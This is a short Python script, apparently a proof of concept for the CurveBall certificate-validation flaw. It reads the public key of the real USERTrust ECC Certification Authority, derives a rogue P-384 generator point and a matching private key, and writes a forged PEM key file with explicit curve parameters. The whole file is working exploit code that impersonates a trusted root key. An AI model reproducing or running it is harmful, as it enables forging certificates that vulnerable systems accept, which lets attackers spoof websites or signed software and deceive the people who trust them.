from fastecdsa.curve import P384
from fastecdsa.point import Point
from Crypto.Util.asn1 import DerSequence, DerOctetString, DerBitString
from binascii import unhexlify, hexlify
import gmpy2
from Crypto.IO import PEM

# USERTrust ECC Certification Authority public key
pubkey = b"1aac545aa9f96823e77ad5246f53c65ad84babc6d5b6d1e67371aedd9cd60c61fddba08903b80514ec57ceee5d3fe221b3cef7d48a79e0a3837e2d97d061c4f199dc259163ab7f30a3b470e2c7a1339cf3bf2e5c53b15fb37d327f8a34e37979"
Q = Point(int(pubkey[0:96],16), int(pubkey[96:],16), curve=P384)

# Generate rogue generator
privkey_inv = 2
# we take the private key as being the inverse of 2 modulo the curve order
privkey = gmpy2.invert(privkey_inv,P384.q)
privkey = unhexlify(f'{privkey:x}'.encode())
# we multply our public key Q with the inverse of our chosen private key value
rogueG = privkey_inv * Q
rogueG = unhexlify(b"04" + f'{rogueG.x:x}'.encode() + f'{rogueG.y:x}'.encode())

# Generate the file with explicit parameters
f = open('p384-key.pem','rt')
keyfile = PEM.decode(f.read())
#print(hexlify(keyfile[0]))
f.close()
seq_der = DerSequence()
der = seq_der.decode(keyfile[0])

# Replace private key
octet_der = DerOctetString(privkey)
der[1] = octet_der.encode()

# Replace public key
#print(hexlify(der[3]))
bits_der = DerBitString(unhexlify(b"04" + pubkey))
der[3] = b"\xa1\x64" + bits_der.encode()
#print(hexlify(der[3]))

# Replace the generator
#print(hexlify(der[2]))
seq_der = DerSequence()
s = seq_der.decode(der[2][4:])
octet_der = DerOctetString(rogueG)
s[3] = octet_der.encode()
der[2] = der[2][:4] + s.encode()
#print(hexlify(der[2]))

# Generate new file
f = open('p384-key-rogue.pem','w')
#print(hexlify(der.encode()))
keyfile = PEM.encode(der.encode(), 'EC PRIVATE KEY')
f.write(keyfile)
f.close()
